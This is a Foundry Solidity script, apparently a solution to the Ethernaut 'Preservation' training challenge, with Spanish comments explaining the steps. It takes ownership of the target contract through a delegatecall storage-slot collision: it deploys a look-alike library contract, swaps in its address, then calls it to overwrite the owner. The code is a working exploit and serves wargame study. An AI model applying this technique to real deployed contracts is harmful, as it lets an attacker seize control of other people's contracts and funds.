// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Preservation} from "../src/16_Preservation.sol";

contract Attacker {
    uint256 public num1;
    uint256 public num2;
    uint256 public storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract PreservationAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
  address player = vm.envAddress("USER");

  function run() external {
    
    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("Preservation");
    Preservation challenge = Preservation(challengeInstanceAddress);
    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker();
    challenge.setSecondTime(uint256(uint160(address(attacker))));
    challenge.setFirstTime(uint256(uint160(player)));
    console.log("Owner: %s", challenge.owner());
    vm.stopBroadcast();
  }
}

// con setSecondTime puedo cambiar el timeZone1Library porque en LibraryContract storedTime esta en el slot 0 igual que timeZone1Library
// Deployo un nuevo contrato (Attacker) que tenga la variable storedTime en el 2do slot, igual que owner en Preservation
// Convierto su address, en este caso 0xE3Ca443c9fd7AF40A2B5a95d43207E763e56005F a decimal: 1300451599771967282525619492230668304923183415391
// La envio a traves de setSecondTime para fijarla en la variable timeZone1Library
// Llamo a setFirstTime con el decimal de MI ADDRESS para ser dueño
// 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 == 520786028573371803640530888255888666801131675076